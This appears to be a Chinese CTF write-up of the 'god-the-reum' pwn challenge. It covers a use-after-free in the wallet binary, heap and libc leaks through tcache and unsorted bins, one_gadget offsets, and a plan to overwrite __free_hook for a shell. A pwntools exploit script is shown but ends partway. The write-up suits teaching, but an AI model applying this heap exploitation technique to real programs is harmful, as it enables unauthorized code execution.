<h4 id="creat-size"><a href="#creat-size" class="headerlink" title="creat_size"></a>creat_size</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>s <span class="token operator">||</span> dword_20202C <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wallet creation failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x82uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">=</span> <span class="token number">30768</span><span class="token punctuation">;</span>
  v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"how much initial eth? : "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%llu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> size<span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>
  <span class="token operator">++</span>dword_20202C<span class="token punctuation">;</span>
  <span class="token function">sub_119B</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Creating new wallet succcess !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>代码有删减 </p>
<p>size可控 主要功能 创建一个size可控的chunk</p>
<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">
  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"how much you wanna withdraw? : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%llu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">=</span> v2<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断是否为0 如果为0则执行free</span>
    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//uaf</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"withdraw ok !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
</code></pre>
<p>这里free以后没有清空指针 导致存在uaf漏洞</p>
<h4 id="print-all"><a href="#print-all" class="headerlink" title="print_all"></a>print_all</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>

<span class="token function">sub_119B</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"========== My Wallet List ============="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dword_20202C<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d) "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_FD5</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">return</span> <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_FD5</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"addr : %s, ballance %llu\n"</span><span class="token punctuation">,</span> a1<span class="token punctuation">,</span> <span class="token operator">*</span>a2<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>打印所有chunk id 及内容</p>
<h4 id="developer"><a href="#developer" class="headerlink" title="developer"></a>developer</h4><pre class=" language-`c"><code class="language-`c">__int64 __fastcall developer(__int64 a1)
{
  sub_119B(a1);
  puts("this menu is only for developer");
  puts("if you are not developer, please get out");
  sleep(1u);
  printf("new eth : ");
  return __isoc99_scanf("%10s", *(_QWORD *)(a1 + 8)); //修改chunk
}
`
</code></pre>
<p>可以修改chunk</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>存在uaf漏洞 所以要从这里入手</p>
<p>首先给定libc 2.27 存在了tcache所以leak方式需要改变</p>
<h4 id="1、how-to-leak"><a href="#1、how-to-leak" class="headerlink" title="1、how to leak"></a>1、how to leak</h4><p>首次执行double free后 打印会泄漏出heap地址</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#多加一个chunk可以防止top chunk回收</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#double free leak heap_base</span>
prints<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span>
</code></pre>
<h5 id="调式结果"><a href="#调式结果" class="headerlink" title="调式结果"></a>调式结果</h5><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">python exp.py

<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  how much you wanna withdraw? <span class="token keyword">:</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  withdraw ok <span class="token operator">!</span>

    <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> Ethereum wallet <span class="token function">service</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
    1. Create new wallet
    2. Deposit eth
    3. Withdraw eth
    4. Show all wallets
    5. <span class="token keyword">exit</span>
    <span class="token keyword">select</span> your choice <span class="token keyword">:</span>
0x564a72bee2f0
</code></pre>
<p>利用gdb查看当前heap地址</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmap
LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
    0x564a718e1000     0x564a718e3000 r-xp     2000 0      /home/ios/god-the-reum
    0x564a71ae2000     0x564a71ae3000 r--p     1000 1000   /home/ios/god-the-reum
    0x564a71ae3000     0x564a71ae4000 rw-p     1000 2000   /home/ios/god-the-reum
    0x564a72bee000     0x564a72c0f000 rw-p    21000 0      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
    0x7f92acc4d000     0x7f92ace34000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f92ace34000     0x7f92ad034000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
</code></pre>
<p>因为leak了一次heap地址填充了1次tcache 所以再次填充6次即可填满tcache 之后free掉的chunk会进入unsorted bin 接着利用print_all 打印出当前bin的fd 即可leak main_arena从而得到libc_base</p>
<h3 id="这里需要掌握的知识"><a href="#这里需要掌握的知识" class="headerlink" title="这里需要掌握的知识"></a>这里需要掌握的知识</h3><h4 id="how-to-leak-libc"><a href="#how-to-leak-libc" class="headerlink" title="how to leak libc"></a>how to leak libc</h4><p>unsort bin是双向链表，如果只有一个chunk fd和bk都是main_arena+偏移。如果是多个就按照双向链表链起来（头和尾都是main_arena+偏移）</p>
<p>需要利用uaf+print配合</p>
<p>填充满tcache后查看当前heap</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> heap
0x563b2fd6b000 PREV_INUSE <span class="token punctuation">{</span>
  mchunk_prev_size <span class="token operator">=</span> 0, 
  mchunk_size <span class="token operator">=</span> 593, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x700000000000000, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x563b2fd6b250 PREV_INUSE <span class="token punctuation">{</span>
  mchunk_prev_size <span class="token operator">=</span> 0, 
  mchunk_size <span class="token operator">=</span> 145, 
  fd <span class="token operator">=</span> 0x3461373737367830, 
  bk <span class="token operator">=</span> 0x3463613331616535, 
  fd_nextsize <span class="token operator">=</span> 0x3630333238336564, 
  bk_nextsize <span class="token operator">=</span> 0x3139613439306631
<span class="token punctuation">}</span>
0x563b2fd6b2e0 PREV_INUSE <span class="token punctuation">{</span>
  mchunk_prev_size <span class="token operator">=</span> 0, 
  mchunk_size <span class="token operator">=</span> 273, 
  fd <span class="token operator">=</span> 0x7ffab2fc9ca0 <span class="token operator">&lt;</span>main_arena+96<span class="token operator">></span>, 
  bk <span class="token operator">=</span> 0x7ffab2fc9ca0 <span class="token operator">&lt;</span>main_arena+96<span class="token operator">></span>, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
</code></pre>
<p>可以看到该chunk fd bk都指向main_arena+96</p>
<p>可以利用 p main_arena查看当前main_arena_addr</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">d0 <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">1680</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
  binmap <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
  next <span class="token operator">=</span> <span class="token number">0x7ffab2fc9c40</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">></span><span class="token punctuation">,</span> 
  next_free <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
  attached_threads <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> 
  system_mem <span class="token operator">=</span> <span class="token number">135168</span><span class="token punctuation">,</span> 
  max_system_mem <span class="token operator">=</span> <span class="token number">135168</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以得到main_arena</p>
<p>利用vmmap 查看当前加载libc基地址</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token number">0x563b2fd6b000</span>     <span class="token number">0x563b2fd8c000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
<span class="token number">0x7ffab2bde000</span>     <span class="token number">0x7ffab2dc5000</span> r<span class="token operator">-</span>xp   <span class="token number">1e7000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so
</code></pre>
<p>由于程序多次执行 导致地址发生变化==  此处计算offfset为同一进程 </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> p/x 0x7ffab2fc9c40-0x7ffab2bde000
<span class="token variable">$2</span> <span class="token operator">=</span> 0x3ebc40
pwndbg<span class="token operator">></span>
</code></pre>
<p>0x7ffab2bde000 这个地址就是libc的实际加载地址，它和main_arena的偏移是固定的</p>
<p>加载地址会变但是这个偏移是不会变的，这样可以获取到远程的libc的加载地址</p>
<p>所以得到main_arena地址就可以计算libc_base了</p>
<h5 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h5><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>heap_addr<span class="token punctuation">)</span>
prints<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">0x3ebc40</span>
libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>offset
</code></pre>
<p>这里减96时因为main_arena地址在这个位置</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token number">0x563b2fd6b2e0</span> PREV_INUSE <span class="token punctuation">{</span>
  mchunk_prev_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
  mchunk_size <span class="token operator">=</span> <span class="token number">273</span><span class="token punctuation">,</span> 
  fd <span class="token operator">=</span> <span class="token number">0x7ffab2fc9ca0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token punctuation">,</span> 
  bk <span class="token operator">=</span> <span class="token number">0x7ffab2fc9ca0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token punctuation">,</span> 
  fd_nextsize <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
  bk_nextsize <span class="token operator">=</span> <span class="token number">0x0</span>
<span class="token punctuation">}</span>
</code></pre>
<p>因为offset = main_arena-libc_addr </p>
<p>所以libc_base = main_arena-offset</p>
<h5 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h5><p>这里有个不明白的地方，在使用one_gadget时查找libc-2.28.so会直接报错 所以这里使用的libc-2.27.so进行做题的～～</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">ios@Sec<span class="token punctuation">:</span><span class="token operator">~</span>$ one_gadget <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so
<span class="token number">0x4f2c5</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
constraints<span class="token punctuation">:</span>
  rcx <span class="token operator">==</span> <span class="token constant">NULL</span>

<span class="token number">0x4f322</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
constraints<span class="token punctuation">:</span>
  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span>

<span class="token number">0x10a38c</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
constraints<span class="token punctuation">:</span>
  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span>
ios@Sec<span class="token punctuation">:</span><span class="token operator">~</span>$
</code></pre>
<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>有了libc base 就可以直接修改 tcache 中的 fd，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。创建一个不大于0x408的chunk，free掉后即可进入tcache，可以修改tcache的fd为free_hook的地址，进行两次分配后，即可分配到free_hook的地址，再次使用developer的隐藏功能直接把free_hook改成onegadget即可getshell</p>
<p>exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./god-the-reum'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'how much initial eth? :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input wallet no :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'how much you wanna withdraw? :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">prints</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">dev</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input wallet no :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'new eth :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>

create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>
create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1//防止合并</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#free 0 all</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#满足free条件后 double free </span>
prints<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak heap</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
